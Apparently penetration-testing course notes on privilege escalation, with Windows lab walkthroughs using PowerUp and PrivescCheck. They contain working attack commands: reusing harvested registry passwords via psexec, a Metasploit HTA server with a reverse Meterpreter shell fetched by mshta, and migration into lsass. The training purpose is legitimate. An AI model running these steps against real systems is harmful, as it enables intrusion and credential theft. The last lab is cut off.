# Privilege Escalation

## Course Introduction

### Course Topic Overview

- Introduction to Privilege Escalation
- Windows Privilege Escalation Techniques
	- Privilege Escalation Scripts (PowerUp, PrivescCheck)
	- Locally Stored Credentials (Unattended Installation Files, Windows Credential Manager, PowerShell History)
	- Insecure Service Permissions
	- Windows Registry AutoRuns
	- Bypassing UAC (UACme)
	- Impersonation Attacks (Incognito, Juicy Potato)
	- DLL Hijacking
- Linux Privilege Escalation Techniques
	- Locally Stored Credentials
	- Misconfigured File Permissions
	- SUID Binaries
	- Misconfigured SUDO Permissions
	- Shared Library Injection

### Prerequisites

- Basic Understanding of Computer Networking
	- Knowledge of IP addresses, subnetting, routing, and network devices (switches, routers, firewalls).
	- Familiarity with common network protocols (TCP, UDP, HTTP, DNS, etc.).
- Fundamentals of Operating Systems
	- Basic knowledge of Windows and Linux operating systems, including their command-line interfaces.
	- Understanding of system processes, file systems, and user permissions.
- Fundamental Knowledge and Experience in Exploitation and Post-Exploitation
	- Experience in performing local enumeration on Windows and Linux targets.
	- Experience with the process of exploitation and post-exploitation on Windows and Linux.
- Experience with Penetration Testing Tools
	- Some experience using common penetration testing tools (e.g., Metasploit, Nmap etc).
	- Understanding of basic penetration testing methodologies and techniques.

### Learning Objectives

1. Understand the Concept of Privilege Escalation
	- Define privilege escalation and explain its importance in penetration testing and red teaming.
2. Identify Common Vulnerabilities Leading to Privilege Escalation
	- Describe common misconfigurations and security flaws in Windows and Linux environments.
	- Recognize typical attack vectors used to escalate privileges.
3. Conduct System Enumeration to Gather Critical Information
	- Utilize various tools to enumerate Windows and Linux systems for valuable information.
	- Interpret and analyze system data to identify potential privilege escalation opportunities.
4. Apply Techniques to Escalate Privileges on Windows Systems
	- Demonstrate the use of insecure services, token impersonation, and other techniques for privilege escalation on Windows.
	- Utilize tools like Metasploit, PowerShell, and PowerUp for privilege escalation.
5. Apply Techniques to Escalate Privileges on Linux Systems
	- Exploit SUID binaries, misconfigured SUDO permissions, and other common Linux privilege escalation methods.
6. Leverage Advanced Privilege Escalation Techniques
	- Implement advanced techniques such as DLL hijacking, bypassing UAC shared object injection.

---
---

## Introduction to Privilege Escalation

### Introduction to Privilege Escalation - Theory

#### Privilege Escalation

Privilege escalation is a critical concept in penetration testing and red teaming.
It refers to the process of gaining elevated access or additional privileges in a computer system or network, typically from a lower-level user to a higher-level user or administrator.
Privilege escalation involves exploiting vulnerabilities or misconfigurations to gain access to resources that are typically restricted to users with higher privileges.

#### Types of Privilege Escalation

Privilege escalation can be divided in two types: vertical and horizontal.

- **Vertical**: the attacker is able to move from a lower privileged user to a higher privileged user. For example from a low-end user to administrator or root user.
- **Horizontal**: the attacker keeps the same set or level of privileges, but assumes the identity of a different user (he/she does not gain any further privilege).

To make things a bit clearer, here are some examples.

- **Vertical privilege escalation**: on a Linux OS, the attacker is able to escalate privileges from a user (i.e. applications) and gain root privileges.
- **Horizontal**: on a Windows OS, the attacker is able to assume the identity on any other Standard user on the system. The attacker is not escalating privileges from a Standard user to an Administrator user.

---


## Windows Privilege Escalation

### Privilege Escalation Scripts: PowerUp - Theory

#### Privilege Escalation with PowerUp

[PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) is a popular tool used in the context of Windows privilege escalation.

It is part of the PowerSploit framework, a collection of PowerShell-based tools designed for offensive security tasks, including enumeration, exploitation, and post-exploitation activities.

PowerUp specifically focuses on identifying common privilege escalation vectors within a Windows environment.

PowerUp automates the process of scanning a Windows system for potential misconfigurations, vulnerabilities, and security flaws that could lead to privilege escalation.
It performs a comprehensive set of checks to identify opportunities for privilege escalation, such as:

- **Insecure Service Configurations**: Services running with elevated privileges (e.g., SYSTEM) that are vulnerable to exploitation due to weak permissions or other security issues.
- **Unquoted Service Paths**: Services with unquoted paths that can be exploited by placing a malicious executable in a strategic location.
- **Weak Registry Permissions**: Registry keys with insecure permissions that allow unauthorized modification, leading to privilege escalation.
- **Vulnerable Scheduled Tasks**: Scheduled tasks that can be manipulated to run with elevated privileges.
- **Insecure File Permissions**: Files or directories with weak permissions that could be exploited to execute code with higher privileges.
- **Insecure DLL Search Orders**: Exploitable DLL search orders that allow DLL hijacking to gain elevated privileges.
- **Stored Credentials**: Credentials stored insecurely in registry keys, files, or other locations.

### Privilege Escalation Scripts: PowerUp - Lab

#### Lab Environment

A Kali GUI machine and a Windows machine provided to you. 

Your task is to run [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) Powershell script to find a common Windows privilege escalation flaw that depends on misconfigurations.
The [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) post-exploitation framework has provided you with the windows machine.

**Objective**: Gain access to Meterpreter session with high privilege.

#### Lab Solution

<span style="color: #64b5f6;">**Target (victim) machine**</span>.

_Obtain the network configuration of the target machine to identify its IP address._

`ipconfig`:
```
Windows IP Configuration

Ethernet adapter Ethernet 3:

   Connection-specific DNS Suffix  . : ec2.internal
   Link-local IPv6 Address . . . . . : fe80::89b9:b7fd:2b0c:ec99%8
   IPv4 Address. . . . . . . . . . . : 10.4.24.251 ←
   Subnet Mask . . . . . . . . . . . : 255.255.240.0
   Default Gateway . . . . . . . . . : 10.4.16.1
```

_Verify the current user on the target machine._

`whoami`:
```
privilege-escal\student ←
```

_Check the privileges assigned to the current user._

`whoami /priv`:
```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

**Explanation:** This command checks the privileges associated with the current user account. The listed privileges indicate what actions the user is permitted to perform on the system.

_List the members of the Administrators group to check if the user has administrative privileges._

`net localgroup Administrators`:
```
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator ←
The command completed successfully.
```

_Navigate to the Desktop directory to explore its contents._

`cd ./Desktop`, `dir`:
```
    Directory: C:\Users\student\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/24/2020   5:35 AM                PowerSploit ←
```

_Enter the 'PowerSploit' directory and list its contents._

`cd ./PowerSploit`, `dir`:
```
    Directory: C:\Users\student\Desktop\PowerSploit

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/24/2020   5:35 AM                AntivirusBypass
d-----       10/24/2020   5:35 AM                CodeExecution
d-----       10/24/2020   5:35 AM                docs
d-----       10/24/2020   5:35 AM                Exfiltration
d-----       10/24/2020   5:35 AM                Mayhem
d-----       10/24/2020   5:35 AM                Persistence
d-----       10/24/2020   5:35 AM                Privesc ←
d-----       10/24/2020   5:35 AM                Recon
d-----       10/24/2020   5:35 AM                ScriptModification
d-----       10/24/2020   5:35 AM                Tests
-a----        8/17/2020   4:13 PM           2638 .gitignore
-a----        8/17/2020   4:13 PM           1590 LICENSE
-a----        8/17/2020   4:13 PM           8505 mkdocs.yml
-a----        8/17/2020   4:13 PM           5278 PowerSploit.psd1
-a----        8/17/2020   4:13 PM            149 PowerSploit.psm1
-a----        8/17/2020   4:13 PM          15646 PowerSploit.pssproj
-a----        8/17/2020   4:13 PM            971 PowerSploit.sln
-a----        8/17/2020   4:13 PM          10225 README.md
```

_Enter the 'Privesc' directory and check the available scripts._

`cd ./PrivEsc`, `dir`:
```
    Directory: C:\Users\student\Desktop\PowerSploit\Privesc

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
------        8/17/2020   4:13 PM          26768 Get-System.ps1
------        8/17/2020   4:13 PM         600580 PowerUp.ps1 ←
------        8/17/2020   4:13 PM           1659 Privesc.psd1
------        8/17/2020   4:13 PM             67 Privesc.psm1
------        8/17/2020   4:13 PM           4569 README.md
```

_Bypass the PowerShell execution policy to run potentially restricted scripts._

`powershell -ep bypass`

**Explanation:** By default, Windows may prevent the execution of PowerShell scripts due to security policies. The `-ep bypass` argument temporarily bypasses this restriction, allowing the execution of potentially restricted scripts.

_Import and execute the 'PowerUp.ps1' script._

`. ./PowerUp.ps1

**Explanation:** This command imports the PowerUp script into the current PowerShell session, making its functions available for use.

_Run the privilege escalation audit to identify any potential vulnerabilities._

`Invoke-PrivEscAudit`:
```
ModifiablePath    : C:\Users\student\AppData\Local\Microsoft\WindowsApps
IdentityReference : PRIVILEGE-ESCAL\student
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\student\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\student\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\student\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

DefaultDomainName    :
DefaultUserName      : Administrator ←
DefaultPassword      : Str0ng_Password_123321 ←
AltDefaultDomainName :
AltDefaultUserName   :
AltDefaultPassword   :
Check                : Registry Autologons
```

**Explanation:** `Invoke-PrivEscAudit` is a PowerUp function that scans the system for common privilege escalation vectors, such as misconfigured permissions, vulnerable services, and plaintext credentials. The output reveals that the Administrator credentials are stored in plaintext in the registry, which is a critical vulnerability.

_Query the registry to confirm the default autologon username._

`reg query 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' /v DefaultUserName`:
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    DefaultUserName    REG_SZ    Administrator ←
```

**Explanation:** The command confirms that the registry key contains the username "Administrator," verifying the data retrieved by `Invoke-PrivEscAudit`.

<span style="color: #e57373;">**Attacker machine**</span>.

_Use PsExec to gain a shell on the target machine as the Administrator using the discovered credentials._

`psexec.py 'Administrator:Str0ng_Password_123321'@10.4.24.251`:
```
Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.4.24.251.....
[*] Found writable share ADMIN$
[*] Uploading file mypFcHIo.exe
[*] Opening SVCManager on 10.4.24.251.....
[*] Creating service ruRo on 10.4.24.251.....
[*] Starting service ruRo.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1457]
(c) 2018 Microsoft Corporation. All rights reserved.
```

**Explanation:** PsExec is a tool that allows the execution of processes on remote systems. Here, it uses the stolen Administrator credentials to open a remote shell on the target machine with elevated privileges.

<span style="color: #64b5f6;">**Target (victim) machine**</span>.

_Verify that the attacker has successfully escalated privileges to the SYSTEM account._

`whoami`:
```
nt authority\system ←
```

_List the privileges available to the SYSTEM account to confirm full control._

`whoami /priv`:
```
PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State   
========================================= ================================================================== ========
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled 
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeTcbPrivilege                            Act as part of the operating system                                Enabled 
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled 
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled 
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled 
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled 
SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled 
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled 
SeAuditPrivilege                          Generate security audits                                           Enabled 
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled 
SeTimeZonePrivilege                       Change the time zone                                               Enabled 
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled 
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled 
```

_Exit the session on the target machine._

`exit`

<span style="color: #e57373;">**Attacker machine**</span>.

_Launch Metasploit to set up an attack payload._

`msfconsole -q`

_Search for and use the HTA server exploit to deliver a malicious payload to the target._

`search hta server`, `use exploit/windows/misc/hta_server`, `set PAYLOAD windows/meterpreter/reverse_tcp`, `show options`, `exploit`:
```
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.42.2:4444 
[*] Using URL: http://0.0.0.0:8080/KKzmhzEYG9UrQdy.hta
[*] Local IP: http://10.10.42.2:8080/KKzmhzEYG9UrQdy.hta ←
[*] Server started.
```

**Explanation:** The HTA server exploit serves an HTML Application (HTA) file, which can execute arbitrary code on the victim machine when opened. The payload, in this case, is a Meterpreter reverse shell that connects back to the attacker's machine.

<span style="color: #64b5f6;">**Target (victim) machine**</span>.

_Use the 'runas' command to execute a new command prompt as the Administrator._

`runas.exe /user:Administrator cmd.exe`:
```
Enter the password for Administrator: ←
Attempting to start cmd.exe as user "PRIVILEGE-ESCAL\Administrator" ... ←
```

_Verify that the command prompt is now running as the Administrator._

`whoami`:
```
privilege-escal\administrator ←
```

_Trigger the HTA payload by executing the provided URL via 'mshta'._

`mshta.exe http://10.10.42.2:8080/KKzmhzEYG9UrQdy.hta`

**Explanation:** `mshta.exe` is used to execute the HTA file hosted by the attacker, which triggers the payload delivery and the reverse shell connection.

<span style="color: #e57373;">**Attacker machine**</span>.

_Observe the response on the attacker's machine indicating that the payload was successfully delivered and a session was opened._

```
[*] 10.4.24.251      hta_server - Delivering Payload ←
[*] Sending stage (176195 bytes) to 10.4.24.251
[*] Meterpreter session 1 opened (10.10.42.2:4444 -> 10.4.24.251:49800) at 2024-08-09 14:58:46 +0530 ←
```

**Explanation:** The attacker's machine confirms that the HTA payload was executed on the target, opening a Meterpreter session.

_List and interact with the active session in Metasploit._

`sessions`, `sessions -i 1`

_Check the current user within the Meterpreter session._

`getuid`:
```
Server username: PRIVILEGE-ESCAL\Administrator ←
```

_Attempt to escalate privileges to SYSTEM within the Meterpreter session._

`getsystem`:
```
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)). ←
```

**Explanation:** The `getsystem` command in Meterpreter attempts to escalate privileges to the SYSTEM account, which is the highest level of access on a Windows machine.

_Verify the current user after privilege escalation._

`getuid`:
```
Server username: NT AUTHORITY\SYSTEM ←
```

_Locate the 'lsass.exe' process to migrate the Meterpreter session into it for persistence._

`pgrep lsass.exe`:
```
624
```

_Migrate the Meterpreter session into the 'lsass.exe' process._

`migrate 624`:
```
[*] Migrating from 2284 to 624...
[*] Migration completed successfully.
```

**Explanation:** Migrating to the `lsass.exe` process (Local Security Authority Subsystem Service) is a common persistence technique that helps maintain the Meterpreter session even if the original exploited process is terminated.

_Open a shell within the Meterpreter session._

`shell`

_Search for any files containing 'flag' on the target machine._

`dir C:\*flag* /s /p`:
```
 Volume in drive C has no label.
 Volume Serial Number is 9E32-0E96

 Directory of C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent

10/24/2020  05:36 AM               551 flag.lnk
               1 File(s)            551 bytes

 Directory of C:\Users\Administrator\Desktop

10/24/2020  05:37 AM                32 flag.txt ←
               1 File(s)             32 bytes
```

_Display the contents of the flag file to retrieve the flag value._

`type C:\Users\Administrator\Desktop\flag.txt`:
```
b5b037a78522671b89a2c1b21d9b80c6 ←
```

### Privilege Escalation Scripts: PrivescCheck - Lab

#### Lab Environment

A Kali GUI machine and a Windows machine provided to you. 

Your task is to run [PrivescCheck.ps1](https://github.com/itm4n/PrivescCheck) script to find a common Windows privilege escalation flaw that depends on misconfigurations.  The PrivescCheck script enumerates common Windows configuration issues that can be leveraged for local privilege escalation.

**Objective**: Gain Administrator user privilege and find the flag.

#### Lab Solution

<span style="color: #64b5f6;">**Target (victim) machine**</span>.

_Obtain the network configuration of the target machine to identify its IP address._

`ipconfig`:
```
Windows IP Configuration

Ethernet adapter Ethernet 3:

   Connection-specific DNS Suffix  . : ec2.internal
   Link-local IPv6 Address . . . . . : fe80::871:5911:280a:b2e7%8
   IPv4 Address. . . . . . . . . . . : 10.4.19.228 ←
   Subnet Mask . . . . . . . . . . . : 255.255.240.0
   Default Gateway . . . . . . . . . : 10.4.16.1
```

_Verify the current user on the target machine._

`whoami`:
```
attackdefense\student ←
```

_Check the privileges assigned to the current user._

`whoami /priv`:
```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

**Explanation:** The `whoami /priv` command shows the privileges available to the current user. These privileges indicate what actions the user can perform on the system, helping assess potential for privilege escalation.

_List the members of the Administrators group to check if the user has administrative privileges._

`net localgroup Administrators`:
```
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator ←
The command completed successfully.
```

**Explanation:** The `net localgroup Administrators` command checks the members of the Administrators group. Only users in this group have full control over the system. Since the `student` user is not listed here, they do not have admin privileges.

_Navigate to the Desktop directory to explore its contents._

`cd ./Desktop`, `dir`:
```
    Directory: C:\Users\student\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/24/2020   5:35 AM                PrivescCheck ←
```

_Enter the 'PrivescCheck' directory and list its contents._

`cd ./PrivescCheck`, `dir`:
```
    Directory: C:\Users\student\Desktop\PrivescCheck

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        6/15/2021  11:32 AM                src
------        6/14/2021   9:38 AM           5112 Build.ps1
------        6/14/2021   9:38 AM           4812 CHANGELOG
------        6/14/2021   9:38 AM           3473 INFORMATION.md
------        6/14/2021   9:38 AM           1522 LICENSE
------        6/14/2021   9:38 AM         137714 PrivescCheck.ps1 ←
------        6/14/2021   9:38 AM         301684 PrivescCheckOld.ps1
------        6/14/2021   9:38 AM           3042 README.md
```

_Bypass the PowerShell execution policy and run the 'PrivescCheck.ps1' script to check for privilege escalation vulnerabilities._

`powershell -ep bypass -c ". ./PrivescCheck.ps1; Invoke-PrivescCheck"`:
```
+------+------------------------------------------------+------+
| TEST | USER > Identity                                | INFO |
+------+------------------------------------------------+------+
| DESC | Get the full name of the current user (domain +       |
|      | username) along with the associated Security          |
|      | Identifier (SID).                                     |
+------+-------------------------------------------------------+
[*] Found 1 result(s).

DisplayName           SID                                           Type
-----------           ---                                           ----
ATTACKDEFENSE\student S-1-5-21-3688751335-3073641799-161370460-1008 User

...

+------+------------------------------------------------+------+
| TEST | CREDS > WinLogon ←                             | VULN |
+------+------------------------------------------------+------+
| DESC | Parse the Winlogon registry keys and check whether    |
|      | they contain any clear-text password. Entries that    |
|      | have an empty password field are filtered out.        |
+------+-------------------------------------------------------+
[*] Found 1 result(s).

Domain   :
Username : administrator ←
Password : hello_123321 ←

...

+------+------------------------------------------------+------+
| TEST | MISC > Hijackable DLLs                         | INFO |
+------+------------------------------------------------+------+
| DESC | List Windows services that are prone to Ghost DLL     |
|      | hijacking. This is particularly relevant if the       |
|      | current user can create files in one of the SYSTEM    |
|      | %PATH% folders.                                       |
+------+-------------------------------------------------------+
[*] Found 3 result(s).

Name           : cdpsgshims.dll
Description    : Loaded by CDPSvc upon service startup
RunAs          : NT AUTHORITY\LocalService
RebootRequired : True

Name           : WptsExtensions.dll
Description    : Loaded by the Task Scheduler upon service startup
RunAs          : LocalSystem
RebootRequired : True

Name           : wlanapi.dll
Description    : Loaded by NetMan when listing network interfaces
RunAs          : LocalSystem
RebootRequired : False

...

+-----------------------------------------------------------------------------+
|                         ~~~ PrivescCheck Report ~~~                         |
+----+------+-----------------------------------------------------------------+
| OK | None | CONFIG > WSUS Configuration                                     |
| OK | None | CONFIG > AlwaysInstallElevated                                  |
| OK | None | CONFIG > PATH Folder Permissions                                |
| OK | None | CONFIG > SCCM Cache Folder                                      |
| KO | Med. | CREDS > WinLogon -> 1 result(s) ←                               |
| OK | None | CREDS > SAM/SYSTEM Backup Files                                 |
| OK | None | CREDS > Unattend Files                                          |
| OK | None | CREDS > GPP Passwords                                           |
| NA | None | CREDS > Vault List                                              |
| NA | None | CREDS > Vault Creds                                             |
| NA | None | HARDENING > BitLocker                                           |
| NA | Info | HARDENING > Credential Guard -> 1 result(s)                     |
| NA | Info | HARDENING > LSA Protection (RunAsPPL) -> 1 result(s)            |
| NA | Info | MISC > Hijackable DLLs -> 3 result(s) ←                         |
| OK | None | SCHEDULED TASKS > Binary Permissions                            |
| OK | None | SCHEDULED TASKS > Unquoted Path                                 |
| OK | None | SERVICES > SCM Permissions                                      |
| NA | Info | SERVICES > Non-default Services -> 5 result(s)                  |
| OK | None | SERVICES > Binary Permissions                                   |
| OK | None | SERVICES > Unquoted Path                                        |
| OK | None | SERVICES > Service Permissions                                  |
| OK | None | SERVICES > Registry Permissions                                 |
| KO | Med. | UPDATES > System up to date? -> 1 result(s)                     |
| NA | Info | USER > Groups -> 13 result(s)                                   |
| NA | Info | USER > Identity -> 1 result(s)                                  |
| NA | None | USER > Environment Variables                                    |
| NA | Info | USER > Privileges -> 2 result(s)                                |
+----+------+-----------------------------------------------------------------+
```

**Explanation:** The `PrivescCheck.ps1` script is a tool that scans for common Windows misconfigurations that could allow privilege escalation. It identifies several vulnerabilities, including clear-text credentials stored in the registry, which is a critical finding that can be exploited to gain higher privileges.

<span style="color: #e57373;">**Attacker machine**</span>.

_Use PsExec to gain a shell on the target machine as the Administrator using the discovered credentials._

`psexec.py Administrator@10.4.19.228`:
```
Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

Password: ←
[*] Requesting shares on 10.4.19.228.....
[*] Found writable share ADMIN$
[*] Uploading file duKQhBxL.exe
[*] Opening SVCManager on 10.4.19.228.....
[*] Creating service KuaL on 10.4.19.228.....
[*] Starting service KuaL.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1457]
(c) 2018 Microsoft Corporation. All rights reserved.
```

**Explanation:** PsExec is a powerful tool used to execute processes on remote systems. Here, the attacker uses the administrator credentials obtained from the `PrivescCheck` script to open a remote shell with elevated privileges on the target machine.

<span style="color: #64b5f6;">**Target (victim) machine**</span>.

_Verify that the attacker has successfully escalated privileges to the SYSTEM account._

`whoami`:
```
nt authority\system ←
```

_List the privileges available to the SYSTEM account to confirm full control._

`whoami /priv`:
```
PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State   
========================================= ================================================================== ========
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled 
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeTcbPrivilege                            Act as part of the operating system                                Enabled 
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled 
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled 
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled 
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled 
SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled 
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled 
SeAuditPrivilege                          Generate security audits                                           Enabled 
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled 
SeTimeZonePrivilege                       Change the time zone                                               Enabled 
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled 
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled 
```

_Search for any files containing 'flag' on the target machine._

`shell`, `where /r C:\ "*flag*"`:
```
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\flag.txt.lnk C:\Users\Administrator\Desktop\flag.txt ←
```

**Explanation:** The `where` command is used to recursively search for files containing the word "flag" in their names. This helps locate the file that contains the flag.

_Display the contents of the flag file to retrieve the flag value._

`type C:\Users\Administrator\Desktop\flag.txt`:
```
2b070a650a92129c2462deae7707b0c5 ←
```

### Locally Stored Credentials: Unattended Installation Files - Theory/Lab

#### Lab Environment

A Kali GUI machine and a Windows machine provided to you. 

Your task is to run [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) Powershell script to find a common Windows privilege escalation flaw that depends on misconfigurations.
The [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) post-exploitation framework has provided to you on the windows machine.

**Objective**: Gain access to Meterpreter session with high privilege.

#### Lab Solution

<span style="color: #64b5f6;">**Target (victim) machine**</span>.

_Obtain the network configuration of the target machine to identify its IP address._

`ipconfig`:
```
Windows IP Configuration

Ethernet adapter Ethernet 3:

   Connection-specific DNS Suffix  . : ec2.internal
   Link-local IPv6 Address . . . . . : fe80::102f:4a0b:7fc5:71f0%8
   IPv4 Address. . . . . . . . . . . : 10.4.30.231 ←
   Subnet Mask . . . . . . . . . . . : 255.255.240.0
   Default Gateway . . . . . . . . . : 10.4.16.1
```

_Verify the current user on the target machine._

`whoami`:
```
priv-esc\student ←
```

_Check the privileges assigned to the current user._

`whoami /priv`:
```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

**Explanation:** This command shows the specific privileges granted to the `student` user. The presence of the `SeChangeNotifyPrivilege` and the absence of more powerful privileges suggest that the user has limited capabilities on the system.

_List the members of the Administrators group to check if the user has administrative privileges._

`net localgroup Administrator`:
```
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator ←
The command completed successfully.
```

**Explanation:** Checking the Administrators group helps confirm whether the `student` user is part of the administrative group. Since only the `Administrator` account is listed, the `student` user does not have administrative rights.

_Navigate to the Desktop directory to explore its contents._

`cd ./Desktop`, `dir`:
```
    Directory: C:\Users\student\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/27/2020  10:09 AM                PowerSploit ←
d-----       10/27/2020  10:09 AM                SysinternalsSuite
d-----       10/27/2020  10:32 AM                Tools
```

_Enter the 'PowerSploit' directory and list its contents._

`cd ./PowerSploit`, `dir`:
```
    Directory: C:\Users\student\Desktop\PowerSploit

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/27/2020  10:09 AM                AntivirusBypass
d-----       10/27/2020  10:09 AM                CodeExecution
d-----        8/17/2020   4:13 PM                docs
d-----       10/27/2020  10:09 AM                Exfiltration
d-----       10/27/2020  10:09 AM                Mayhem
d-----       10/27/2020  10:09 AM                Persistence
d-----       10/27/2020  10:09 AM                Privesc ←
d-----       10/27/2020  10:09 AM                Recon
d-----       10/27/2020  10:09 AM                ScriptModification
d-----       10/27/2020  10:09 AM                Tests
-a----       10/27/2020  10:09 AM           2638 .gitignore
-a----       10/27/2020  10:09 AM           1590 LICENSE
-a----       10/27/2020  10:09 AM           8505 mkdocs.yml
-a----       10/27/2020  10:09 AM           5278 PowerSploit.psd1
-a----       10/27/2020  10:09 AM            149 PowerSploit.psm1
-a----       10/27/2020  10:09 AM          15646 PowerSploit.pssproj
-a----       10/27/2020  10:09 AM            971 PowerSploit.sln
-a----       10/27/2020  10:09 AM          10225 README.md
```

_Navigate to the 'PrivEsc' directory and list its contents._

`cd ./PrivEsc`, `dir`:
```
    Directory: C:\Users\student\Desktop\PowerSploit\Privesc

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/27/2020  10:09 AM          26768 Get-System.ps1
-a----       10/27/2020  10:09 AM         600580 PowerUp.ps1 ←
-a----       10/27/2020  10:09 AM           1659 Privesc.psd1
-a----       10/27/2020  10:09 AM             67 Privesc.psm1
-a----       10/27/2020  10:09 AM           4569 README.md
```

_Execute the PowerUp.ps1 script to identify potential privilege escalation vulnerabilities._

`powershell -ep bypass -c ". ./PowerUp.ps1; Invoke-PrivEscAudit"`:
```
ModifiablePath    : C:\Users\student\AppData\Local\Microsoft\WindowsApps
IdentityReference : PRIV-ESC\student
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\student\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\student\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\student\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

UnattendPath : C:\Windows\Panther\Unattend.xml ←
Name         : C:\Windows\Panther\Unattend.xml
Check        : Unattended Install Files
```

